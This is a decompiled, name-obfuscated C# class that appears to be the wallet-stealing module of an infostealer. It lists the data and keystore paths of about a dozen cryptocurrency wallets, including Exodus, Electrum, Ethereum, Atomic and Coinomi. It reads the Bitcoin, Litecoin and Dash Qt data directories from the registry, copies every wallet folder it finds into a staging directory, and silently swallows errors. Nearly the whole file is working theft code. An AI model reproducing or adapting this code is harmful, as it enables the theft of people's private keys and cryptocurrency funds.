using System.Collections.Generic;
using System.IO;
using Microsoft.Win32;
using ns13;
using ns14;

namespace ns3;

internal sealed class Class12
{
	private static List<string[]> list_0 = new List<string[]>
	{
		new string[2]
		{
			"Zcash",
			Class55.string_3 + "\\Zcash"
		},
		new string[2]
		{
			"Armory",
			Class55.string_3 + "\\Armory"
		},
		new string[2]
		{
			"Bytecoin",
			Class55.string_3 + "\\bytecoin"
		},
		new string[2]
		{
			"Jaxx",
			Class55.string_3 + "\\com.liberty.jaxx\\IndexedDB\\file__0.indexeddb.leveldb"
		},
		new string[2]
		{
			"Exodus",
			Class55.string_3 + "\\Exodus\\exodus.wallet"
		},
		new string[2]
		{
			"Ethereum",
			Class55.string_3 + "\\Ethereum\\keystore"
		},
		new string[2]
		{
			"Electrum",
			Class55.string_3 + "\\Electrum\\wallets"
		},
		new string[2]
		{
			"AtomicWallet",
			Class55.string_3 + "\\atomic\\Local Storage\\leveldb"
		},
		new string[2]
		{
			"Guarda",
			Class55.string_3 + "\\Guarda\\Local Storage\\leveldb"
		},
		new string[2]
		{
			"Coinomi",
			Class55.string_4 + "\\Coinomi\\Coinomi\\wallets"
		}
	};

	private static string[] string_0 = new string[3] { "Litecoin", "Dash", "Bitcoin" };

	public static void smethod_0(string string_1)
	{
		try
		{
			Directory.CreateDirectory(string_1);
			foreach (string[] item in list_0)
			{
				smethod_1(string_1, item[1], item[0]);
			}
			string[] array = string_0;
			foreach (string string_2 in array)
			{
				smethod_2(string_1, string_2);
			}
			if (Class54.int_9 == 0)
			{
				Class62.smethod_0(string_1);
			}
		}
		catch
		{
		}
	}

	private static void smethod_1(string string_1, string string_2, string string_3)
	{
		string string_4 = Path.Combine(string_1, string_3);
		if (Directory.Exists(string_2))
		{
			Class62.smethod_1(string_2, string_4);
			Class54.int_9++;
		}
	}

	private static void smethod_2(string string_1, string string_2)
	{
		string string_3 = Path.Combine(string_1, string_2);
		try
		{
			using RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software")!.OpenSubKey(string_2)!.OpenSubKey(string_2 + "-Qt");
			if (registryKey != null)
			{
				string path = registryKey.GetValue("strDataDir")!.ToString() + "\\wallets";
				if (Directory.Exists(path))
				{
					Class62.smethod_1(path, string_3);
					Class54.int_9++;
				}
			}
		}
		catch
		{
		}
	}
}
